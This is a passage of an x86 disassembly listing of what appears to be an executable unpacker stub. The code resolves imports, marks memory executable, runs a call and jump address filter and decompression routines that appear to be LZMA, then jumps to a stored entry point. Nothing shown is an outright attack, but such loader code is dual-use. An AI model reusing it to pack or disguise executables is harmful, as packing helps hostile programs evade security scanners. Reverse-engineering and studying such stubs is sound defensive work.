  4078d0:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  4078d4:	0f 84 1e 02 00 00    	je     0x407af8
  4078da:	a1 04 70 40 00       	mov    0x407004,%eax
  4078df:	83 b8 84 00 00 00 00 	cmpl   $0x0,0x84(%eax)
  4078e6:	0f 84 0c 02 00 00    	je     0x407af8
  4078ec:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
  4078f2:	50                   	push   %eax
  4078f3:	6a 40                	push   $0x40
  4078f5:	6a 14                	push   $0x14
  4078f7:	ff b5 b4 fd ff ff    	push   -0x24c(%ebp)
  4078fd:	ff 15 44 70 40 00    	call   *0x407044
  407903:	8b 85 b4 fd ff ff    	mov    -0x24c(%ebp),%eax
  407909:	8b 0d 08 70 40 00    	mov    0x407008,%ecx
  40790f:	03 48 0c             	add    0xc(%eax),%ecx
  407912:	89 8d c8 fd ff ff    	mov    %ecx,-0x238(%ebp)
  407918:	ff b5 c8 fd ff ff    	push   -0x238(%ebp)
  40791e:	ff 15 40 70 40 00    	call   *0x407040
  407924:	89 85 a4 fd ff ff    	mov    %eax,-0x25c(%ebp)
  40792a:	83 bd a4 fd ff ff 00 	cmpl   $0x0,-0x25c(%ebp)
  407931:	75 16                	jne    0x407949
  407933:	6a 08                	push   $0x8
  407935:	6a 00                	push   $0x0
  407937:	ff b5 c8 fd ff ff    	push   -0x238(%ebp)
  40793d:	ff 15 3c 70 40 00    	call   *0x40703c
  407943:	89 85 a4 fd ff ff    	mov    %eax,-0x25c(%ebp)
  407949:	83 bd a4 fd ff ff 00 	cmpl   $0x0,-0x25c(%ebp)
  407950:	75 7e                	jne    0x4079d0
  407952:	8b 85 c8 fd ff ff    	mov    -0x238(%ebp),%eax
  407958:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  40795e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407961:	8d 84 05 e8 fe ff ff 	lea    -0x118(%ebp,%eax,1),%eax
  407968:	89 85 84 fd ff ff    	mov    %eax,-0x27c(%ebp)
  40796e:	8b 85 84 fd ff ff    	mov    -0x27c(%ebp),%eax
  407974:	89 85 80 fd ff ff    	mov    %eax,-0x280(%ebp)
  40797a:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  407980:	8a 00                	mov    (%eax),%al
  407982:	88 85 7f fd ff ff    	mov    %al,-0x281(%ebp)
  407988:	8b 85 84 fd ff ff    	mov    -0x27c(%ebp),%eax
  40798e:	8a 8d 7f fd ff ff    	mov    -0x281(%ebp),%cl
  407994:	88 08                	mov    %cl,(%eax)
  407996:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  40799c:	40                   	inc    %eax
  40799d:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  4079a3:	8b 85 84 fd ff ff    	mov    -0x27c(%ebp),%eax
  4079a9:	40                   	inc    %eax
  4079aa:	89 85 84 fd ff ff    	mov    %eax,-0x27c(%ebp)
  4079b0:	80 bd 7f fd ff ff 00 	cmpb   $0x0,-0x281(%ebp)
  4079b7:	75 c1                	jne    0x40797a
  4079b9:	6a 08                	push   $0x8
  4079bb:	6a 00                	push   $0x0
  4079bd:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  4079c3:	50                   	push   %eax
  4079c4:	ff 15 3c 70 40 00    	call   *0x40703c
  4079ca:	89 85 a4 fd ff ff    	mov    %eax,-0x25c(%ebp)
  4079d0:	83 bd a4 fd ff ff 00 	cmpl   $0x0,-0x25c(%ebp)
  4079d7:	75 0a                	jne    0x4079e3
  4079d9:	e9 cf 01 00 00       	jmp    0x407bad
  4079de:	e9 ca 01 00 00       	jmp    0x407bad
  4079e3:	8b 85 b4 fd ff ff    	mov    -0x24c(%ebp),%eax
  4079e9:	8b 0d 08 70 40 00    	mov    0x407008,%ecx
  4079ef:	03 48 10             	add    0x10(%eax),%ecx
  4079f2:	89 8d d4 fd ff ff    	mov    %ecx,-0x22c(%ebp)
  4079f8:	8b 85 b4 fd ff ff    	mov    -0x24c(%ebp),%eax
  4079fe:	83 38 00             	cmpl   $0x0,(%eax)
  407a01:	75 0b                	jne    0x407a0e
  407a03:	8b 85 d4 fd ff ff    	mov    -0x22c(%ebp),%eax
  407a09:	89 45 f0             	mov    %eax,-0x10(%ebp)
  407a0c:	eb 11                	jmp    0x407a1f
  407a0e:	8b 85 b4 fd ff ff    	mov    -0x24c(%ebp),%eax
  407a14:	8b 0d 08 70 40 00    	mov    0x407008,%ecx
  407a1a:	03 08                	add    (%eax),%ecx
  407a1c:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  407a1f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407a22:	83 38 00             	cmpl   $0x0,(%eax)
  407a25:	0f 84 b9 00 00 00    	je     0x407ae4
  407a2b:	83 a5 98 fd ff ff 00 	andl   $0x0,-0x268(%ebp)
  407a32:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407a35:	8b 00                	mov    (%eax),%eax
  407a37:	25 00 00 00 80       	and    $0x80000000,%eax
  407a3c:	74 22                	je     0x407a60
  407a3e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407a41:	8b 00                	mov    (%eax),%eax
  407a43:	25 ff ff 00 00       	and    $0xffff,%eax
  407a48:	0f b7 c0             	movzwl %ax,%eax
  407a4b:	50                   	push   %eax
  407a4c:	ff b5 a4 fd ff ff    	push   -0x25c(%ebp)
  407a52:	ff 15 38 70 40 00    	call   *0x407038
  407a58:	89 85 98 fd ff ff    	mov    %eax,-0x268(%ebp)
  407a5e:	eb 26                	jmp    0x407a86
  407a60:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407a63:	8b 00                	mov    (%eax),%eax
  407a65:	03 05 08 70 40 00    	add    0x407008,%eax
  407a6b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407a6e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407a71:	40                   	inc    %eax
  407a72:	40                   	inc    %eax
  407a73:	50                   	push   %eax
  407a74:	ff b5 a4 fd ff ff    	push   -0x25c(%ebp)
  407a7a:	ff 15 38 70 40 00    	call   *0x407038
  407a80:	89 85 98 fd ff ff    	mov    %eax,-0x268(%ebp)
  407a86:	83 bd 98 fd ff ff 00 	cmpl   $0x0,-0x268(%ebp)
  407a8d:	75 0a                	jne    0x407a99
  407a8f:	e9 19 01 00 00       	jmp    0x407bad
  407a94:	e9 14 01 00 00       	jmp    0x407bad
  407a99:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
  407a9f:	50                   	push   %eax
  407aa0:	6a 40                	push   $0x40
  407aa2:	6a 04                	push   $0x4
  407aa4:	ff b5 d4 fd ff ff    	push   -0x22c(%ebp)
  407aaa:	ff 15 44 70 40 00    	call   *0x407044
  407ab0:	6a 04                	push   $0x4
  407ab2:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  407ab8:	50                   	push   %eax
  407ab9:	ff b5 d4 fd ff ff    	push   -0x22c(%ebp)
  407abf:	e8 a5 f8 ff ff       	call   0x407369
  407ac4:	83 c4 0c             	add    $0xc,%esp
  407ac7:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407aca:	83 c0 04             	add    $0x4,%eax
  407acd:	89 45 f0             	mov    %eax,-0x10(%ebp)
  407ad0:	8b 85 d4 fd ff ff    	mov    -0x22c(%ebp),%eax
  407ad6:	83 c0 04             	add    $0x4,%eax
  407ad9:	89 85 d4 fd ff ff    	mov    %eax,-0x22c(%ebp)
  407adf:	e9 3b ff ff ff       	jmp    0x407a1f
  407ae4:	8b 85 b4 fd ff ff    	mov    -0x24c(%ebp),%eax
  407aea:	83 c0 14             	add    $0x14,%eax
  407aed:	89 85 b4 fd ff ff    	mov    %eax,-0x24c(%ebp)
  407af3:	e9 d2 fd ff ff       	jmp    0x4078ca
  407af8:	a1 04 70 40 00       	mov    0x407004,%eax
  407afd:	8b 0d 08 70 40 00    	mov    0x407008,%ecx
  407b03:	03 48 6c             	add    0x6c(%eax),%ecx
  407b06:	89 0d 1c 70 40 00    	mov    %ecx,0x40701c
  407b0c:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
  407b12:	50                   	push   %eax
  407b13:	6a 40                	push   $0x40
  407b15:	68 00 10 00 00       	push   $0x1000
  407b1a:	ff 35 08 70 40 00    	push   0x407008
  407b20:	ff 15 44 70 40 00    	call   *0x407044
  407b26:	8b 85 b0 fd ff ff    	mov    -0x250(%ebp),%eax
  407b2c:	0f b7 40 14          	movzwl 0x14(%eax),%eax
  407b30:	8b 8d b0 fd ff ff    	mov    -0x250(%ebp),%ecx
  407b36:	8d 44 01 18          	lea    0x18(%ecx,%eax,1),%eax
  407b3a:	89 85 b8 fd ff ff    	mov    %eax,-0x248(%ebp)
  407b40:	8b 85 b8 fd ff ff    	mov    -0x248(%ebp),%eax
  407b46:	8b 40 24             	mov    0x24(%eax),%eax
  407b49:	25 00 00 00 80       	and    $0x80000000,%eax
  407b4e:	74 25                	je     0x407b75
  407b50:	8b 85 b8 fd ff ff    	mov    -0x248(%ebp),%eax
  407b56:	83 c0 24             	add    $0x24,%eax
  407b59:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  407b5f:	8b 85 b8 fd ff ff    	mov    -0x248(%ebp),%eax
  407b65:	8b 40 24             	mov    0x24(%eax),%eax
  407b68:	2d 00 00 00 80       	sub    $0x80000000,%eax
  407b6d:	8b 8d 94 fd ff ff    	mov    -0x26c(%ebp),%ecx
  407b73:	89 01                	mov    %eax,(%ecx)
  407b75:	6a 00                	push   $0x0
  407b77:	ff b5 c0 fd ff ff    	push   -0x240(%ebp)
  407b7d:	68 00 10 00 00       	push   $0x1000
  407b82:	ff 35 08 70 40 00    	push   0x407008
  407b88:	ff 15 44 70 40 00    	call   *0x407044
  407b8e:	a1 1c 70 40 00       	mov    0x40701c,%eax
  407b93:	5f                   	pop    %edi
  407b94:	5e                   	pop    %esi
  407b95:	5b                   	pop    %ebx
  407b96:	8b e5                	mov    %ebp,%esp
  407b98:	5d                   	pop    %ebp
  407b99:	50                   	push   %eax
  407b9a:	a1 04 70 40 00       	mov    0x407004,%eax
  407b9f:	83 78 6c 00          	cmpl   $0x0,0x6c(%eax)
  407ba3:	75 05                	jne    0x407baa
  407ba5:	58                   	pop    %eax
  407ba6:	33 c0                	xor    %eax,%eax
  407ba8:	40                   	inc    %eax
  407ba9:	c3                   	ret
  407baa:	58                   	pop    %eax
  407bab:	ff e0                	jmp    *%eax
  407bad:	6a 00                	push   $0x0
  407baf:	ff 15 34 70 40 00    	call   *0x407034
  407bb5:	cc                   	int3
  407bb6:	55                   	push   %ebp
  407bb7:	8b ec                	mov    %esp,%ebp
  407bb9:	83 ec 30             	sub    $0x30,%esp
  407bbc:	33 c9                	xor    %ecx,%ecx
  407bbe:	41                   	inc    %ecx
  407bbf:	33 c0                	xor    %eax,%eax
  407bc1:	53                   	push   %ebx
  407bc2:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  407bc5:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  407bc8:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  407bcb:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  407bce:	88 4d f1             	mov    %cl,-0xf(%ebp)
  407bd1:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  407bd4:	56                   	push   %esi
  407bd5:	8b 75 14             	mov    0x14(%ebp),%esi
  407bd8:	83 c1 fb             	add    $0xfffffffb,%ecx
  407bdb:	57                   	push   %edi
  407bdc:	8b 7d 08             	mov    0x8(%ebp),%edi
  407bdf:	89 45 dc             	mov    %eax,-0x24(%ebp)
  407be2:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  407be5:	89 45 e8             	mov    %eax,-0x18(%ebp)
  407be8:	89 45 ec             	mov    %eax,-0x14(%ebp)
  407beb:	88 45 f0             	mov    %al,-0x10(%ebp)
  407bee:	c6 45 f2 02          	movb   $0x2,-0xe(%ebp)
  407bf2:	c6 45 f3 02          	movb   $0x2,-0xd(%ebp)
  407bf6:	c6 45 f4 03          	movb   $0x3,-0xc(%ebp)
  407bfa:	c6 45 f5 03          	movb   $0x3,-0xb(%ebp)
  407bfe:	c6 45 f6 03          	movb   $0x3,-0xa(%ebp)
  407c02:	c6 45 f7 03          	movb   $0x3,-0x9(%ebp)
  407c06:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  407c09:	8a 0c 38             	mov    (%eax,%edi,1),%cl
  407c0c:	80 f9 e8             	cmp    $0xe8,%cl
  407c0f:	74 0b                	je     0x407c1c
  407c11:	80 f9 e9             	cmp    $0xe9,%cl
  407c14:	74 06                	je     0x407c1c
  407c16:	40                   	inc    %eax
  407c17:	e9 12 01 00 00       	jmp    0x407d2e
  407c1c:	8b 55 18             	mov    0x18(%ebp),%edx
  407c1f:	8b 5d 10             	mov    0x10(%ebp),%ebx
  407c22:	8b c8                	mov    %eax,%ecx
  407c24:	2b 0a                	sub    (%edx),%ecx
  407c26:	03 cb                	add    %ebx,%ecx
  407c28:	03 d8                	add    %eax,%ebx
  407c2a:	83 f9 05             	cmp    $0x5,%ecx
  407c2d:	89 1a                	mov    %ebx,(%edx)
  407c2f:	76 05                	jbe    0x407c36
  407c31:	83 26 00             	andl   $0x0,(%esi)
  407c34:	eb 10                	jmp    0x407c46
  407c36:	85 c9                	test   %ecx,%ecx
  407c38:	76 0c                	jbe    0x407c46
  407c3a:	8b 16                	mov    (%esi),%edx
  407c3c:	83 e2 77             	and    $0x77,%edx
  407c3f:	03 d2                	add    %edx,%edx
  407c41:	49                   	dec    %ecx
  407c42:	75 f8                	jne    0x407c3c
  407c44:	89 16                	mov    %edx,(%esi)
  407c46:	8a 54 38 04          	mov    0x4(%eax,%edi,1),%dl
  407c4a:	84 d2                	test   %dl,%dl
  407c4c:	74 09                	je     0x407c57
  407c4e:	80 fa ff             	cmp    $0xff,%dl
  407c51:	0f 85 c3 00 00 00    	jne    0x407d1a
  407c57:	8b 0e                	mov    (%esi),%ecx
  407c59:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  407c5c:	d1 6d 0c             	shrl   $1,0xc(%ebp)
  407c5f:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  407c62:	83 e3 07             	and    $0x7,%ebx
  407c65:	83 7c 9d d0 00       	cmpl   $0x0,-0x30(%ebp,%ebx,4)
  407c6a:	0f 84 aa 00 00 00    	je     0x407d1a
  407c70:	83 7d 0c 10          	cmpl   $0x10,0xc(%ebp)
  407c74:	0f 83 a0 00 00 00    	jae    0x407d1a
  407c7a:	33 db                	xor    %ebx,%ebx
  407c7c:	8a fa                	mov    %dl,%bh
  407c7e:	0f b6 54 38 02       	movzbl 0x2(%eax,%edi,1),%edx
  407c83:	8a 5c 38 03          	mov    0x3(%eax,%edi,1),%bl
  407c87:	c1 e3 08             	shl    $0x8,%ebx
  407c8a:	0b da                	or     %edx,%ebx
  407c8c:	0f b6 54 38 01       	movzbl 0x1(%eax,%edi,1),%edx
  407c91:	c1 e3 08             	shl    $0x8,%ebx
  407c94:	0b da                	or     %edx,%ebx
  407c96:	2b d8                	sub    %eax,%ebx
  407c98:	2b 5d 10             	sub    0x10(%ebp),%ebx
  407c9b:	83 eb 05             	sub    $0x5,%ebx
  407c9e:	85 c9                	test   %ecx,%ecx
  407ca0:	8b d3                	mov    %ebx,%edx
  407ca2:	74 48                	je     0x407cec
  407ca4:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  407ca7:	0f b6 4c 0d f0       	movzbl -0x10(%ebp,%ecx,1),%ecx
  407cac:	6a 03                	push   $0x3
  407cae:	5b                   	pop    %ebx
  407caf:	2b d9                	sub    %ecx,%ebx
  407cb1:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  407cb4:	8b cb                	mov    %ebx,%ecx
  407cb6:	c1 e1 03             	shl    $0x3,%ecx
  407cb9:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  407cbc:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  407cbf:	8b da                	mov    %edx,%ebx
  407cc1:	d3 eb                	shr    %cl,%ebx
  407cc3:	84 db                	test   %bl,%bl
  407cc5:	74 05                	je     0x407ccc
  407cc7:	80 fb ff             	cmp    $0xff,%bl
  407cca:	75 20                	jne    0x407cec
  407ccc:	33 db                	xor    %ebx,%ebx
  407cce:	6a 04                	push   $0x4
  407cd0:	43                   	inc    %ebx
  407cd1:	59                   	pop    %ecx
  407cd2:	2b 4d fc             	sub    -0x4(%ebp),%ecx
  407cd5:	c1 e1 03             	shl    $0x3,%ecx
  407cd8:	d3 e3                	shl    %cl,%ebx
  407cda:	4b                   	dec    %ebx
  407cdb:	33 da                	xor    %edx,%ebx
  407cdd:	2b d8                	sub    %eax,%ebx
  407cdf:	2b 5d 10             	sub    0x10(%ebp),%ebx
  407ce2:	83 eb 05             	sub    $0x5,%ebx
  407ce5:	83 3e 00             	cmpl   $0x0,(%esi)
  407ce8:	8b d3                	mov    %ebx,%edx
  407cea:	75 d0                	jne    0x407cbc
  407cec:	8b ca                	mov    %edx,%ecx
  407cee:	c1 e9 18             	shr    $0x18,%ecx
  407cf1:	80 e1 01             	and    $0x1,%cl
  407cf4:	fe c9                	dec    %cl
  407cf6:	f6 d1                	not    %cl
  407cf8:	88 4c 38 04          	mov    %cl,0x4(%eax,%edi,1)
  407cfc:	8b ca                	mov    %edx,%ecx
  407cfe:	c1 e9 10             	shr    $0x10,%ecx
  407d01:	88 4c 38 03          	mov    %cl,0x3(%eax,%edi,1)
  407d05:	8b ca                	mov    %edx,%ecx
  407d07:	c1 e9 08             	shr    $0x8,%ecx
  407d0a:	88 4c 38 02          	mov    %cl,0x2(%eax,%edi,1)
  407d0e:	88 54 38 01          	mov    %dl,0x1(%eax,%edi,1)
  407d12:	83 c0 05             	add    $0x5,%eax
  407d15:	83 26 00             	andl   $0x0,(%esi)
  407d18:	eb 14                	jmp    0x407d2e
  407d1a:	83 0e 01             	orl    $0x1,(%esi)
  407d1d:	8b 0e                	mov    (%esi),%ecx
  407d1f:	40                   	inc    %eax
  407d20:	84 d2                	test   %dl,%dl
  407d22:	74 05                	je     0x407d29
  407d24:	80 fa ff             	cmp    $0xff,%dl
  407d27:	75 05                	jne    0x407d2e
  407d29:	83 c9 10             	or     $0x10,%ecx
  407d2c:	89 0e                	mov    %ecx,(%esi)
  407d2e:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  407d31:	0f 86 d2 fe ff ff    	jbe    0x407c09
  407d37:	5f                   	pop    %edi
  407d38:	5e                   	pop    %esi
  407d39:	5b                   	pop    %ebx
  407d3a:	c9                   	leave
  407d3b:	c3                   	ret
  407d3c:	8b 54 24 04          	mov    0x4(%esp),%edx
  407d40:	8b 0a                	mov    (%edx),%ecx
  407d42:	3b 4a 04             	cmp    0x4(%edx),%ecx
  407d45:	75 0a                	jne    0x407d51
  407d47:	c7 42 10 01 00 00 00 	movl   $0x1,0x10(%edx)
  407d4e:	0c ff                	or     $0xff,%al
  407d50:	c3                   	ret
  407d51:	8a 01                	mov    (%ecx),%al
  407d53:	41                   	inc    %ecx
  407d54:	89 0a                	mov    %ecx,(%edx)
  407d56:	c3                   	ret
  407d57:	55                   	push   %ebp
  407d58:	8b ec                	mov    %esp,%ebp
  407d5a:	8b 45 0c             	mov    0xc(%ebp),%eax
  407d5d:	53                   	push   %ebx
  407d5e:	56                   	push   %esi
  407d5f:	8b 75 08             	mov    0x8(%ebp),%esi
  407d62:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  407d66:	85 c0                	test   %eax,%eax
  407d68:	8b 5e 0c             	mov    0xc(%esi),%ebx
  407d6b:	57                   	push   %edi
  407d6c:	8b 7e 08             	mov    0x8(%esi),%edi
  407d6f:	89 45 0c             	mov    %eax,0xc(%ebp)
  407d72:	7e 32                	jle    0x407da6
  407d74:	d1 65 08             	shll   $1,0x8(%ebp)
  407d77:	d1 ef                	shr    $1,%edi
  407d79:	3b df                	cmp    %edi,%ebx
  407d7b:	72 06                	jb     0x407d83
  407d7d:	2b df                	sub    %edi,%ebx
  407d7f:	83 4d 08 01          	orl    $0x1,0x8(%ebp)
  407d83:	81 ff 00 00 00 01    	cmp    $0x1000000,%edi
  407d89:	73 12                	jae    0x407d9d
  407d8b:	56                   	push   %esi
  407d8c:	c1 e7 08             	shl    $0x8,%edi
  407d8f:	e8 a8 ff ff ff       	call   0x407d3c
  407d94:	0f b6 c0             	movzbl %al,%eax
  407d97:	c1 e3 08             	shl    $0x8,%ebx
  407d9a:	59                   	pop    %ecx
  407d9b:	0b d8                	or     %eax,%ebx
  407d9d:	ff 4d 0c             	decl   0xc(%ebp)
  407da0:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  407da4:	7f ce                	jg     0x407d74
  407da6:	8b 45 08             	mov    0x8(%ebp),%eax
  407da9:	89 7e 08             	mov    %edi,0x8(%esi)
  407dac:	5f                   	pop    %edi
  407dad:	89 5e 0c             	mov    %ebx,0xc(%esi)
  407db0:	5e                   	pop    %esi
  407db1:	5b                   	pop    %ebx
  407db2:	5d                   	pop    %ebp
  407db3:	c3                   	ret
  407db4:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  407db8:	0f b7 11             	movzwl (%ecx),%edx
  407dbb:	56                   	push   %esi
  407dbc:	8b 74 24 0c          	mov    0xc(%esp),%esi
  407dc0:	8b 46 08             	mov    0x8(%esi),%eax
  407dc3:	57                   	push   %edi
  407dc4:	8b f8                	mov    %eax,%edi
  407dc6:	c1 ef 0b             	shr    $0xb,%edi
  407dc9:	0f af fa             	imul   %edx,%edi
  407dcc:	8b 56 0c             	mov    0xc(%esi),%edx
  407dcf:	3b d7                	cmp    %edi,%edx
  407dd1:	73 3e                	jae    0x407e11
  407dd3:	89 7e 08             	mov    %edi,0x8(%esi)
  407dd6:	0f b7 01             	movzwl (%ecx),%eax
  407dd9:	0f b7 d0             	movzwl %ax,%edx
  407ddc:	bf 00 08 00 00       	mov    $0x800,%edi
  407de1:	2b fa                	sub    %edx,%edi
  407de3:	c1 ff 05             	sar    $0x5,%edi
  407de6:	03 f8                	add    %eax,%edi
  407de8:	66 89 39             	mov    %di,(%ecx)
  407deb:	81 7e 08 00 00 00 01 	cmpl   $0x1000000,0x8(%esi)
  407df2:	73 19                	jae    0x407e0d
  407df4:	56                   	push   %esi
  407df5:	e8 42 ff ff ff       	call   0x407d3c
  407dfa:	59                   	pop    %ecx
  407dfb:	8b 4e 0c             	mov    0xc(%esi),%ecx
  407dfe:	0f b6 c0             	movzbl %al,%eax
  407e01:	c1 e1 08             	shl    $0x8,%ecx
  407e04:	0b c1                	or     %ecx,%eax
  407e06:	c1 66 08 08          	shll   $0x8,0x8(%esi)
  407e0a:	89 46 0c             	mov    %eax,0xc(%esi)
  407e0d:	33 c0                	xor    %eax,%eax
  407e0f:	eb 3f                	jmp    0x407e50
  407e11:	2b c7                	sub    %edi,%eax
  407e13:	2b d7                	sub    %edi,%edx
  407e15:	89 46 08             	mov    %eax,0x8(%esi)
  407e18:	89 56 0c             	mov    %edx,0xc(%esi)
  407e1b:	0f b7 01             	movzwl (%ecx),%eax
  407e1e:	66 8b d0             	mov    %ax,%dx
  407e21:	66 c1 ea 05          	shr    $0x5,%dx
  407e25:	66 2b c2             	sub    %dx,%ax
  407e28:	66 89 01             	mov    %ax,(%ecx)
  407e2b:	81 7e 08 00 00 00 01 	cmpl   $0x1000000,0x8(%esi)
  407e32:	73 19                	jae    0x407e4d
  407e34:	56                   	push   %esi
  407e35:	e8 02 ff ff ff       	call   0x407d3c
  407e3a:	59                   	pop    %ecx
  407e3b:	8b 4e 0c             	mov    0xc(%esi),%ecx
  407e3e:	0f b6 c0             	movzbl %al,%eax
  407e41:	c1 e1 08             	shl    $0x8,%ecx
  407e44:	0b c1                	or     %ecx,%eax
  407e46:	c1 66 08 08          	shll   $0x8,0x8(%esi)
  407e4a:	89 46 0c             	mov    %eax,0xc(%esi)
  407e4d:	33 c0                	xor    %eax,%eax
  407e4f:	40                   	inc    %eax
  407e50:	5f                   	pop    %edi
  407e51:	5e                   	pop    %esi
  407e52:	c3                   	ret
  407e53:	55                   	push   %ebp
  407e54:	8b ec                	mov    %esp,%ebp
  407e56:	33 c0                	xor    %eax,%eax
  407e58:	57                   	push   %edi
  407e59:	8b 7d 0c             	mov    0xc(%ebp),%edi
  407e5c:	40                   	inc    %eax
  407e5d:	85 ff                	test   %edi,%edi
  407e5f:	7e 1c                	jle    0x407e7d
  407e61:	56                   	push   %esi
  407e62:	ff 75 10             	push   0x10(%ebp)
  407e65:	8d 34 00             	lea    (%eax,%eax,1),%esi
  407e68:	8b 45 08             	mov    0x8(%ebp),%eax
  407e6b:	03 c6                	add    %esi,%eax
  407e6d:	50                   	push   %eax
  407e6e:	e8 41 ff ff ff       	call   0x407db4
  407e73:	03 c6                	add    %esi,%eax
  407e75:	4f                   	dec    %edi
  407e76:	85 ff                	test   %edi,%edi
  407e78:	59                   	pop    %ecx
  407e79:	59                   	pop    %ecx
  407e7a:	7f e6                	jg     0x407e62
  407e7c:	5e                   	pop    %esi
  407e7d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  407e80:	33 d2                	xor    %edx,%edx
  407e82:	42                   	inc    %edx
  407e83:	d3 e2                	shl    %cl,%edx
  407e85:	5f                   	pop    %edi
  407e86:	2b c2                	sub    %edx,%eax
  407e88:	5d                   	pop    %ebp
  407e89:	c3                   	ret
  407e8a:	53                   	push   %ebx
  407e8b:	33 d2                	xor    %edx,%edx
  407e8d:	57                   	push   %edi
  407e8e:	33 db                	xor    %ebx,%ebx
  407e90:	42                   	inc    %edx
  407e91:	33 ff                	xor    %edi,%edi
  407e93:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  407e97:	7e 27                	jle    0x407ec0
  407e99:	56                   	push   %esi
  407e9a:	8b 44 24 10          	mov    0x10(%esp),%eax
  407e9e:	ff 74 24 18          	push   0x18(%esp)
  407ea2:	8d 34 12             	lea    (%edx,%edx,1),%esi
  407ea5:	03 c6                	add    %esi,%eax
  407ea7:	50                   	push   %eax
  407ea8:	e8 07 ff ff ff       	call   0x407db4
  407ead:	59                   	pop    %ecx
  407eae:	59                   	pop    %ecx
  407eaf:	8b cf                	mov    %edi,%ecx
  407eb1:	8d 14 06             	lea    (%esi,%eax,1),%edx
  407eb4:	d3 e0                	shl    %cl,%eax
  407eb6:	0b d8                	or     %eax,%ebx
  407eb8:	47                   	inc    %edi
  407eb9:	3b 7c 24 14          	cmp    0x14(%esp),%edi
  407ebd:	7c db                	jl     0x407e9a
  407ebf:	5e                   	pop    %esi
  407ec0:	5f                   	pop    %edi
  407ec1:	8b c3                	mov    %ebx,%eax
  407ec3:	5b                   	pop    %ebx
  407ec4:	c3                   	ret
  407ec5:	33 c0                	xor    %eax,%eax
  407ec7:	40                   	inc    %eax
  407ec8:	56                   	push   %esi
  407ec9:	ff 74 24 0c          	push   0xc(%esp)
  407ecd:	8d 34 00             	lea    (%eax,%eax,1),%esi
  407ed0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  407ed4:	03 c6                	add    %esi,%eax
  407ed6:	50                   	push   %eax
  407ed7:	e8 d8 fe ff ff       	call   0x407db4
  407edc:	0b c6                	or     %esi,%eax
  407ede:	3d 00 01 00 00       	cmp    $0x100,%eax
  407ee3:	59                   	pop    %ecx
  407ee4:	59                   	pop    %ecx
  407ee5:	7c e2                	jl     0x407ec9
  407ee7:	5e                   	pop    %esi
  407ee8:	c3                   	ret
  407ee9:	55                   	push   %ebp
  407eea:	8b ec                	mov    %esp,%ebp
  407eec:	53                   	push   %ebx
  407eed:	56                   	push   %esi
  407eee:	33 db                	xor    %ebx,%ebx
  407ef0:	57                   	push   %edi
  407ef1:	43                   	inc    %ebx
  407ef2:	bf 00 01 00 00       	mov    $0x100,%edi
  407ef7:	0f b6 75 10          	movzbl 0x10(%ebp),%esi
  407efb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407efe:	ff 75 0c             	push   0xc(%ebp)
  407f01:	d0 65 10             	shlb   $1,0x10(%ebp)
  407f04:	c1 ee 07             	shr    $0x7,%esi
  407f07:	8d 46 01             	lea    0x1(%esi),%eax
  407f0a:	c1 e0 08             	shl    $0x8,%eax
  407f0d:	03 c3                	add    %ebx,%eax
  407f0f:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  407f12:	50                   	push   %eax
  407f13:	e8 9c fe ff ff       	call   0x407db4
  407f18:	03 db                	add    %ebx,%ebx
  407f1a:	59                   	pop    %ecx
  407f1b:	0b d8                	or     %eax,%ebx
  407f1d:	3b f0                	cmp    %eax,%esi
  407f1f:	59                   	pop    %ecx
  407f20:	75 1d                	jne    0x407f3f
  407f22:	3b df                	cmp    %edi,%ebx
  407f24:	7c d1                	jl     0x407ef7
  407f26:	eb 1b                	jmp    0x407f43
  407f28:	8b 45 08             	mov    0x8(%ebp),%eax
  407f2b:	ff 75 0c             	push   0xc(%ebp)
  407f2e:	8d 34 1b             	lea    (%ebx,%ebx,1),%esi
  407f31:	03 c6                	add    %esi,%eax
  407f33:	50                   	push   %eax
  407f34:	e8 7b fe ff ff       	call   0x407db4
  407f39:	59                   	pop    %ecx
  407f3a:	0b c6                	or     %esi,%eax
  407f3c:	59                   	pop    %ecx
  407f3d:	8b d8                	mov    %eax,%ebx
  407f3f:	3b df                	cmp    %edi,%ebx
  407f41:	7c e5                	jl     0x407f28
  407f43:	5f                   	pop    %edi
  407f44:	5e                   	pop    %esi
  407f45:	8a c3                	mov    %bl,%al
  407f47:	5b                   	pop    %ebx
  407f48:	5d                   	pop    %ebp
  407f49:	c3                   	ret
  407f4a:	56                   	push   %esi
